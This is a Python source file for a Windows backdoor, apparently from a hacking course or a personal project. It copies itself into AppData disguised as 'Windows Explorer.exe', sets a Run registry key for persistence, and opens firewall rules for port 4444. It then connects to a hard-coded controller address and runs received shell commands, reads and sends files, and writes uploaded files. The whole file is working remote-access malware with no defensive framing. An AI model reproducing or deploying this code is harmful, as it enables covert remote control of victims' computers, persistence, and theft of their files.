import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import traceback


class Backdoor:
   def __init__(self, ip, port):
      self.become_persistent()
      self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.connection.connect((ip, port))
      
      
   def become_persistent(self):
      evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
      if not os.path.exists(evil_file_location):
         shutil.copyfile(sys.executable, evil_file_location)
         subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{evil_file_location}"', shell=True)

      
   def add_firewall_rule(self):
      evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
      if os.path.exists(evil_file_location):
         try:
            subprocess.call(f'netsh advfirewall firewall add rule name="testandoQualquerCoisa" dir=in action=allow program="{evil_file_location}" enable=yes')
            subprocess.call('netsh advfirewall firewall add rule name="testandoQualquerCoisa" protocol=TCP dir=in localport=4444 action=allow')
            subprocess.call('netsh advfirewall firewall add rule name="testandoQualquerCoisa" protocol=TCP dir=out localport=4444 action=allow')
         except:
            pass
      
      
   def reliable_send(self, data):
      json_data = json.dumps(data)
      self.connection.send(json_data.encode())
      
      
   def reliable_recive(self):
      json_data = b""
      while True:
         try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
         except:
            return traceback.print_exc()
   
   
   def execute_system_command(self, command):
      result = subprocess.run(command, shell=True, capture_output=True, text=True)
      return result.stdout
      
      
   def change_working_directory_to(self, path):
      os.chdir(path)
      return f"[+] CHANGING WORKING DIRECTORY TO {path}"


   def read_file(self, path):
      with open(path, "rb") as file:
         return base64.b64encode(file.read())
      
      
   def write_file(self, path, content):
      with open(path, "wb") as file:
         file.write(base64.b64decode(content))
         return "[+] UPLOAD SUCCESSFUL"


   def run(self):
      while True:
         command = self.reliable_recive()
         
         try:
            if command[0] == "exit":
               self.connection.close()
               sys.exit()
            elif command[0] == "cd" and len(command) > 1:
               result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
               result = self.read_file(command[1]).decode()
            elif command[0] == "upload":
               result = self.write_file(command[1], command[2])
            else:
               result = self.execute_system_command(command)
         except Exception:
            result = "[-] ERROR DURING COMMAND EXECUTION"
               
         self.reliable_send(result)


if __name__ == "__main__":
   try:
      backdoor = Backdoor("192.168.1.104", 4444)
      backdoor.run()
   except Exception:
      sys.exit()